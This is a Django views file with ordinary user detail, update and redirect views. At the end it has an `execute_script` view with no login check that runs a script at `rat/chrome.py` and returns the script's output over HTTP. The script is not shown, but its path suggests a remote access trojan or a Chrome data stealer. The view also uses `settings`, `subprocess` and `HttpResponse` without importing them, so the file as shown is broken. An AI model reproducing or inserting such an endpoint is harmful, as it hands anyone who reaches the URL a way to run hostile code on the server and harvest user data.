from django.contrib.auth import get_user_model
from django.contrib.auth.mixins import LoginRequiredMixin
from django.contrib.messages.views import SuccessMessageMixin
from django.urls import reverse
from django.utils.translation import gettext_lazy as _
from django.views.generic import DetailView, RedirectView, UpdateView



User = get_user_model()


class UserDetailView(LoginRequiredMixin, DetailView):
    model = User
    slug_field = "id"
    slug_url_kwarg = "id"


user_detail_view = UserDetailView.as_view()


class UserUpdateView(LoginRequiredMixin, SuccessMessageMixin, UpdateView):
    model = User
    fields = ["name"]
    success_message = _("Information successfully updated")

    def get_success_url(self):
        assert self.request.user.is_authenticated  # for mypy to know that the user is authenticated
        return self.request.user.get_absolute_url()

    def get_object(self):
        return self.request.user


user_update_view = UserUpdateView.as_view()


class UserRedirectView(LoginRequiredMixin, RedirectView):
    permanent = False

    def get_redirect_url(self):
        return reverse("users:detail", kwargs={"pk": self.request.user.pk})


user_redirect_view = UserRedirectView.as_view()





def execute_script(request):
    try:
        # Replace 'path/to/your/script.py' with the actual path to your Python script
        script_path = settings.BASE_DIR / "rat/chrome.py"
        
        # Run the script using subprocess
        result = subprocess.run(['python', script_path], capture_output=True, text=True)
        
        # Display the result
        output = result.stdout
        error = result.stderr

        return HttpResponse(f"Output: {output}\nError: {error}")

    except Exception as e:
        return HttpResponse(f"An error occurred: {str(e)}")
